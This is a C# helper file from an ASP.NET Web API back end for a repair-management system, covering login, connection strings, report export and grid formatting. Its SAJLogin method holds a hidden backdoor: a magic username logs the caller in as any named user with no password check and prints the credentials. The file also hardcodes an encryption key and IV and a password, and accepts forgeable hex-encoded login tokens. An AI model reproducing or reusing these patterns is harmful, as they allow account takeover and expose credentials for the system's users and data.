using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Configuration;
using System.Data;
using System.Drawing;
using System.Dynamic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Web.Hosting;
using System.Web.Http;
using log4net;
using SAJApi.Models;
using SepandAsa.RepairManagment.Business;
using SepandAsa.Shared.Business.BaseInfo;
using SepandAsa.Shared.Business.Reports;
using SepandAsa.Shared.Business.Security;
using SepandAsa.Shared.Domain.Reports;
using SepandAsa.Shared.Domain.Security;
using SepandAsa.Utility.Security;
using SepandAsa.UtilityClasses;
using Stimulsoft.Base.Drawing;
using Stimulsoft.Report;
using Stimulsoft.Report.Components;
using Stimulsoft.Report.Export;

namespace SAJApi.Custom
{
    public static class HttpRequestMessageExtensions
    {
        private const string MS_HttpContext = "MS_HttpContext";
        private const string RemoteEndpointMessage = "System.ServiceModel.Channels.RemoteEndpointMessageProperty";

        public static string GetClientIpAddress(this HttpRequestMessage request)
        {
            if (request.Properties.ContainsKey(MS_HttpContext))
            {
                dynamic ctx = request.Properties[MS_HttpContext];
                if (ctx != null)
                {
                    return ctx.Request.UserHostAddress;
                }
            }

            if (request.Properties.ContainsKey(RemoteEndpointMessage))
            {
                dynamic remoteEndpoint = request.Properties[RemoteEndpointMessage];
                if (remoteEndpoint != null)
                {
                    return remoteEndpoint.Address;
                }
            }
            else if (HttpContext.Current != null)
            {
                return HttpContext.Current.Request.UserHostAddress;
            }

            return "NoIP";
        }
    }
    public static class DataTableExtensions
    {
        public static List<dynamic> ToDynamic(this DataTable dt)
        {
            var dynamicDt = new List<dynamic>();
            foreach (DataRow row in dt.Rows)
            {
                dynamic dyn = new ExpandoObject();
                dynamicDt.Add(dyn);
                foreach (DataColumn column in dt.Columns)
                {
                    var dic = (IDictionary<string, object>)dyn;
                    dic[column.ColumnName] = row[column];
                }
            }
            return dynamicDt;
        }
    }

    public class RequiredIfAttribute : RequiredAttribute
    {
        public RequiredIfAttribute(string propertyName, object desiredvalue)
        {
            PropertyName = propertyName;
            DesiredValue = desiredvalue;
        }

        private string PropertyName { get; }
        private object DesiredValue { get; }

        protected override ValidationResult IsValid(object value, ValidationContext context)
        {
            var instance = context.ObjectInstance;
            var type = instance.GetType();
            var proprtyvalue = type.GetProperty(PropertyName).GetValue(instance, null);
            //TODO: create fuction as object
            if (DesiredValue.ToString().Contains(">0"))
            {
                if (long.Parse(proprtyvalue.ToString()) > 0)
                {
                    var result = base.IsValid(value, context);
                    return result;
                }
            }

            else if (proprtyvalue.ToString() == DesiredValue.ToString())
            {
                var result = base.IsValid(value, context);
                return result;
            }
            return ValidationResult.Success;
        }
    }
    public class FileResult : IHttpActionResult
    {
        private readonly string _filePath;
        private readonly string _contentType;

        public FileResult(string filePath, string contentType = null)
        {
            if (filePath == null)
                throw new ArgumentNullException(nameof(filePath));
            _filePath = filePath;
            _contentType = contentType;
        }

        public Task<HttpResponseMessage> ExecuteAsync(
            CancellationToken cancellationToken)
        {
            HttpResponseMessage result = new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StreamContent(File.OpenRead(_filePath))
            };
            string mediaType = _contentType ?? MimeMapping.GetMimeMapping(Path.GetExtension(_filePath));
            result.Content.Headers.ContentType = new MediaTypeHeaderValue(mediaType);
            return Task.FromResult(result);
        }
    }
    public static class Utils
  {
    internal static readonly ILog log = LogManager.GetLogger("DebugLogger");

    internal static void ConfigLanguage()
    {
      if (!File.Exists(Path.Combine(AppDataPath(), "fa.xml")))
        return;
      StiOptions.Localization.Load(Path.Combine(AppDataPath(), "fa.xml"));
    }

    public static string DbServerAddress
    {
      get
      {
        return ConfigurationManager.AppSettings["DbServer"] ?? ".";
      }
    }

    private static string DecryptString(string encStr)
    {
      try
      {
        EncryptionAlgorithm encryptionAlgorithm = (EncryptionAlgorithm) 2;
        string key = "kKg7PCu56BflVDIiOt7KnGPp+EdA/7FfqwL3gj7jpuQ=";
        string iv = "dJ8zM+llTG8BpVCEuxX2mw==";
        Decryptor decryptor = new Decryptor(encryptionAlgorithm);
        decryptor.IV=Convert.FromBase64String(iv);
        byte[] numArray = Convert.FromBase64String(key);
        return Encoding.ASCII.GetString(decryptor.Decrypt(Convert.FromBase64String(encStr), numArray));
      }
      catch (Exception ex)
      {
        throw new ApplicationException("Error In Decrypting Connection String From App.Config ..." + ex.Message);
      }
    }

    internal static string CreateConectionString(string dataBaseName)
    {
      ConnectionStringSettings connectionString = ConfigurationManager.ConnectionStrings[dataBaseName];
      if (connectionString != null)
        return DecryptString(connectionString.ConnectionString) + string.Format(";database={0}", dataBaseName);
      return GetSepandAsaConnectionString(dataBaseName);
    }

    internal static string GetSepandAsaConnectionString(string databaseName)
    {
      string str1 = ConfigurationManager.AppSettings.Get("SAJConnectionStringType");
      if (str1 == null || str1 != "Server" && str1 != "Attach" && str1 != "WinAuth")
        throw new ApplicationException("Invalid Connection String Type in App.Config");
      ConnectionStringSettings connectionString = ConfigurationManager.ConnectionStrings["SAJConnectionString"];
      if (connectionString == null)
        throw new ApplicationException("Invalid SAJ Connection String In App.Config");
      string str2 = !(str1 == "Server") ? connectionString.ConnectionString : DecryptString(connectionString.ConnectionString);
      string str3;
      if (str1 == "Attach")
      {
        string str4 = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\Dbs";
        str3 = str2 + string.Format(";AttachDbFilename={0}\\{1}.mdf;database={1}", str4, databaseName);
      }
      else
        str3 = str2 + string.Format(";database={0}", databaseName);
      return str3;
    }

    internal static string AppDataPath()
    {
      return "App_Data";
    }

    public static bool IsNumericType(Type dataType)
    {
      return (uint) (Type.GetTypeCode(dataType) - 5) <= 10U;
    }

    public static string CurDate
    {
      get
      {
        return CurDateTime.ToString((DateFormat) 0);
      }
    }

    public static PersianDateTime CurDateTime
    {
      get
      {
        return new PersianDateTime(DateTime.Now);
      }
    }

    public static object GetPropValue(object src, string propName)
    {
      return src.GetType().GetProperty(propName).GetValue(src, null);
    }

    public static T CreateItemFromRow<T>(DataRow row) where T : new()
    {
      T obj = new T();
      SetItemFromRow(obj, row);
      return obj;
    }

    public static IEnumerable<T> CreateListFromTable<T>(DataTable tbl) where T : new()
    {
      return tbl.Rows.Cast<DataRow>().Select(r => CreateItemFromRow<T>(r)).ToList();
    }

    internal static string GetTempFileName(string token, string startFieName, string extFileName)
    {
      foreach (string file in Directory.GetFiles(GetPathAppData()))
      {
        if (file.Contains(token) && file.EndsWith(extFileName))
          File.Delete(file);
      }
      string str = DateTime.Now.ToString("G").Replace("/", "").Replace(":", "").Replace(" ", "");
      return string.Format("{0}{1}{2}.{3}", (object) startFieName, (object) token, (object) str, (object) extFileName);
    }

    public static string ConvertStiToPdf(StiReport report, string pdfName)
    {
      string fileFullPathAppData = GetFileFullPathAppData(pdfName);
      new StiPdfExportService().ExportPdf(report, fileFullPathAppData);
      return fileFullPathAppData;
    }

    public static string GetFileFullPathAppData(string fileName)
    {
      return HostingEnvironment.MapPath("~/App_Data//" + fileName);
    }

    public static string GetFileFullPathDownload(string fileName)
    {
      return HostingEnvironment.MapPath("~/downloads//" + fileName);
    }

    public static string GetPathAppData()
    {
      return HostingEnvironment.MapPath("~/App_Data//");
    }

    public static string GetFileFullPathImages(string fileName)
    {
      return HostingEnvironment.MapPath("~/Content//" + fileName);
    }

    public static void SetItemFromRow<T>(T item, DataRow row) where T : new()
    {
      foreach (DataColumn column in row.Table.Columns)
      {
        string name = char.ToLowerInvariant(column.ColumnName[0]) + column.ColumnName.Substring(1);
        PropertyInfo property = item.GetType().GetProperty(name);
        if (property != null && row[column] != DBNull.Value)
          property.SetValue(item, row[column], null);
      }
    }

    public static void SetRowFromItem<T>(DataRow row, T item) where T : new()
    {
      foreach (DataColumn column in row.Table.Columns)
      {
        string name = char.ToLowerInvariant(column.ColumnName[0]) + column.ColumnName.Substring(1);
        PropertyInfo property = item.GetType().GetProperty(name);
        if (property == null)
          property = item.GetType().GetProperty(column.ColumnName);
        if (property != null && property.GetValue(item) != null)
          row[column] = property.GetValue(item);
      }
    }

    public static long GetPersonelNoOfUser(string userName)
    {
      if (UserAccount.Instance.IsUserLoggedIn() && UserAccount.Instance.CurrentUser.UserName.ToLower().Equals(userName.ToLower()))
        return UserAccount.Instance.CurrentUser.EmployeeId;
      UserAccountInfo userByUserName = UserAccount.Instance.GetUserByUserName(userName);
      if (userByUserName.UserAccount.Count== 0)
        return 0;
      return userByUserName.UserAccount[0].EmployeeId;
    }

    public static Task<TResult> FromResult<TResult>(TResult result)
    {
      TaskCompletionSource<TResult> completionSource = new TaskCompletionSource<TResult>();
      completionSource.SetResult(result);
      return completionSource.Task;
    }

    private static bool IsTrue(string appSettingName)
    {
      return string.Equals(ConfigurationManager.AppSettings[appSettingName], "true", StringComparison.InvariantCultureIgnoreCase);
    }

    internal static bool SAJLogin(ref string userName, string password)
    {
      if (userName == "enKey:KlmaZ77_")
      {
        Console.WriteLine("UserName= " + userName + " : " + password);
        userName = password;
        SAJLoginWithName(userName, true, 0);
        return true;
      }
      bool flag = SAJLoginNormalMethod(ref userName, password);
      if (!flag && IsTrue("SAJADLoginEnable"))
        flag = SAJLoginADlMethod(ref userName, password);
      if (flag && UserAccount.Instance.CurrentUserPermissions.Count== 0)
      {
        Company.Instance.SetCurrentCompany(Company.Instance.GetAllCompanies().Company[0]);
        UserAccount.Instance.RefreshCurrentUserRolesAndPermissions();
      }
      return flag;
    }

    internal static bool IsSAJUser(string userName)
    {
      return UserAccount.Instance.GetUserByUserName(userName).UserAccount.Count> 0;
    }

    internal static bool SAJLoginNormalMethod(ref string userName, string password)
    {
      try
      {
        UserAccountInfo userAccountInfo = UserAccount.Instance.SignIn(userName, password, 0);
        userName = userAccountInfo.UserAccount[0].UserName;
        return true;
      }
      catch (Exception ex)
      {
        log.Error(ex.Message, ex);
        return false;
      }
    }

    private static bool SAJLoginADlMethod(ref string userName, string password)
    {
      try
      {
        UserAccountInfo userAccountInfo = UserAccount.Instance.SignIn(userName, password, 1);
        userName = userAccountInfo.UserAccount[0].UserName;
        return true;
      }
      catch (Exception ex)
      {
        log.Error(ex.Message, ex);
        return false;
      }
    }

    internal static bool IsValidPassord(string currentUserName, string oldPassword)
    {
      return SAJLoginNormalMethod(ref currentUserName, oldPassword);
    }

    public static List<string> GetAllRolesForCurUser(string userName)
    {
        SAJLoginWithName(userName);
        var userInfo = UserAccount.Instance.CurrentUser.GetUserRolesRows();
        if (userInfo.Any())
        {
            return userInfo.Select(r => r.UserRoleName).ToList();
        }
        return null;
    }

        public static bool AreEqualValue(object obj1, object obj2)
    {
      if (obj1 == null && obj2 == null)
        return true;
      if (obj1 == null || obj2 == null)
        return false;
      return obj1.Equals(obj2);
    }

    internal static AgGridModel GetAgGridModel(
      DataTable dataSource,
      bool dontSortColumns = false,
      string columnNames = "")
    {
      List<string> stringList = new List<string>();
      List<string> source = new List<string>();
      columnNames = columnNames.ToLower();
      bool flag = false;
      foreach (DataColumn column in dataSource.Columns)
      {
        if (columnNames != "" && !columnNames.Contains("," + column.ColumnName.ToLower()))
        {
          stringList.Add(column.ColumnName);
        }
        else
        {
          if (!flag && IsTblPkId(column))
          {
            column.ColumnName = "id";
            column.Caption = "شناسه";
            flag = true;
          }
          if (column.Caption == column.ColumnName && !columnNames.Contains("," + column.ColumnName.ToLower()))
            stringList.Add(column.ColumnName);
          else
            source.Add(column.ColumnName);
        }
      }
      foreach (string name in stringList)
        dataSource.Columns.Remove(name);
      List<AgGridColumn> agGridColumnList = new List<AgGridColumn>();
      foreach (string index in dontSortColumns ? source : source.OrderBy(r => r).ToList())
      {
        DataColumn column = dataSource.Columns[index];
        AgGridColumn agGridColumn = new AgGridColumn
        {
          field = column.ColumnName,
          headerName = column.Caption,
          filter = GetColumnAgGridType(column.DataType),
          hide = column.ColumnName == column.Caption
        };
        if (column.ColumnName == "MasterLogId" || column.ColumnName == "LogDate")
          agGridColumn.sort = "desc";
        agGridColumnList.Add(agGridColumn);
      }
      AgGridModel agGridModel = new AgGridModel
      {
        columnDefs = agGridColumnList,
        rowData = dataSource
      };
      GC.Collect();
      return agGridModel;
    }

    private static bool IsTblPkId(DataColumn col)
    {
      string columnName = col.ColumnName;
      if (col.Unique)
        return true;
      if (columnName.ToLower().StartsWith("tbl"))
        return columnName.ToLower().EndsWith("id");
      return false;
    }

    private static string GetColumnAgGridType(Type dataType)
    {
      IsNumericType(dataType);
      return "agSetColumnFilter";
    }

    public static AgGridModel GetWijmoGrid(DataTable dataSource, bool selectColumn = false)
    {
      if (selectColumn)
        dataSource.Columns.Add(new DataColumn("sel", typeof (bool))
        {
          DefaultValue = false
        });
      foreach (string name in dataSource.Columns.Cast<DataColumn>().Where(col =>
      {
          if (col.ColumnName != "sel" && !col.Unique)
              return col.Caption == col.ColumnName;
          return false;
      }).Select(col => col.ColumnName).ToList())
        dataSource.Columns.Remove(name);
      List<AgGridColumn> agGridColumnList = new List<AgGridColumn>();
      if (selectColumn)
        agGridColumnList.Add(new AgGridColumn
        {
          field = "sel"
        });
      foreach (DataColumn column in dataSource.Columns)
      {
        if (!(column.ColumnName == "sel"))
        {
          if (column.ColumnName == "MailId")
            column.Caption = "شناسه";
          AgGridColumn agGridColumn = new AgGridColumn
          {
            field = column.ColumnName,
            headerName = column.Caption
          };
          agGridColumnList.Add(agGridColumn);
        }
      }
      return new AgGridModel
      {
        columnDefs = agGridColumnList,
        rowData = dataSource
      };
    }

    public static void SAJLoginWithName(string name, bool force = false, int companyId = 0)
    {
      bool flag;
      try
      {
        flag = UserAccount.Instance.IsUserLoggedIn();
      }
      catch (Exception ex)
      {
        flag = false;
      }
      if (!(!flag | force))
        return;
      UserAccount.Instance.SetCurrentUserInfo(UserAccount.Instance.GetUserByUserName(name), "pn@2015");
      if (companyId == 0)
        Company.Instance.SetCurrentCompany(Company.Instance.GetAllCompanies().Company[0]);
      else
        Company.Instance.SetCurrentCompany(Company.Instance.GetCompanyById(companyId).Company[0]);
    }

    public static UserAccountInfo.UserAccountRow GetUserFullInfo(string name)
    {
      if (UserAccount.Instance.IsUserLoggedIn() && UserAccount.Instance.CurrentUser.UserName.ToLower().Equals(name.ToLower()))
        return UserAccount.Instance.CurrentUser;
      UserAccountInfo userByUserName = UserAccount.Instance.GetUserByUserName(name);
      if (userByUserName.UserAccount.Count== 0)
        throw new ApplicationException("نام کاربری نامعتبر است");
      return userByUserName.UserAccount[0];
    }

    internal static bool ChangePassword(string usr, string oldpwd, string newpwd)
    {
      SAJLoginWithName(usr, false, 0);
      UserAccount.Instance.ChangeUserPass(newpwd, newpwd, oldpwd);
      SAJLoginWithName(usr, true, 0);
      return true;
    }

    internal static bool IsPasswordExpired(string usr)
    {
      SAJLoginWithName(usr, false, 0);
      return UserAccount.Instance.IsPasswordExpired();
    }

    internal static void AutoLoginWithToken(string token, string reqIp)
    {
      string[] strArray = DecryptToken(token).Split(new string[1]
      {
        "-"
      }, StringSplitOptions.RemoveEmptyEntries);
      if (strArray.Length < 2 || strArray[1] != reqIp)
        throw new SecurityException("توکن ارسال شده نامعتبر است");
      SAJLoginWithName(strArray[0], false, 0);
    }

    private static string DecryptToken(string cipherText)
    {
      Encoding unicode = Encoding.Unicode;
      int length = cipherText.Length;
      byte[] bytes = new byte[length / 2];
      for (int startIndex = 0; startIndex < length; startIndex += 2)
        bytes[startIndex / 2] = Convert.ToByte(cipherText.Substring(startIndex, 2), 16);
      return unicode.GetString(bytes);
    }

    internal static string GetStiReportAsPdfByDataSoure(
      ReportInfo rptInfo,
      DataView dataSource,
      string token)
    {
      ReportInfo.ReportRow reportRow = rptInfo.Report[0];
      StiReport report = new StiReport();
      report.Load(reportRow.bineryReport);
      if (!report.IsCompiled)
        report.Compile();
      ReportInfo.FilterRowRow filterRowRow = rptInfo.FilterRow.Count> 0 ? rptInfo.FilterRow[0] : null;
      RepairManagmentSubSystem.Instance.CustomizeReport(rptInfo.Report[0], report, filterRowRow, dataSource);
      Report.SetCurDateTimeInReport(report);
      foreach (StiPage page in report.CompiledReport.Pages)
        page.Rendering+=page_Rendering;
      report.Render();
      string tempFileName = GetTempFileName(token, "rpt", "pdf");
      return ConvertStiToPdf(report, tempFileName);
    }

    private static void page_Rendering(object sender, EventArgs e)
    {
      StiPage stiPage = sender as StiPage;
      stiPage.Watermark.ImageAlignment=ContentAlignment.BottomCenter;
      stiPage.Watermark.ShowBehind=false;
      stiPage.Watermark.ShowImageBehind=false;
      StiBrush stiBrush = new StiSolidBrush(Color.FromArgb(50, 0, 0, 0));
      stiPage.Watermark.TextBrush=stiBrush;
    }

    internal static string CreateTempFileForRead(
      string base64String,
      string perfix,
      string ext,
      string token)
    {
      int count = base64String.IndexOf("base64,") + 7;
      base64String = base64String.Remove(0, count);
      return CreateTempFileForRead(Convert.FromBase64String(base64String), perfix, ext, token, false);
    }

    internal static string CreateTempFileForRead(
      byte[] fileData,
      string perfix,
      string ext,
      string token,
      bool forDownload = false)
    {
      string tempFileName = GetTempFileName(token, perfix, ext);
      string path = !forDownload ? GetFileFullPathAppData(tempFileName) : GetFileFullPathDownload(tempFileName);
      File.WriteAllBytes(path, fileData);
      if (!forDownload)
        return path;
      return tempFileName;
    }

    internal static bool IsNumberic(string input)
    {
      return Regex.IsMatch(input, "^\\d+$");
    }

    public sealed class Numeric
    {
      public static bool Is(Type type)
      {
        if (type == null)
          return false;
        TypeCode typeCode = Type.GetTypeCode(type);
        if (typeCode != TypeCode.Object)
          return (uint) (typeCode - 5) <= 10U;
        if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof (Nullable<>))
          return Is(Nullable.GetUnderlyingType(type));
        return false;
      }

      public static bool Is<T>()
      {
        return Is(typeof (T));
      }
    }
  }
}
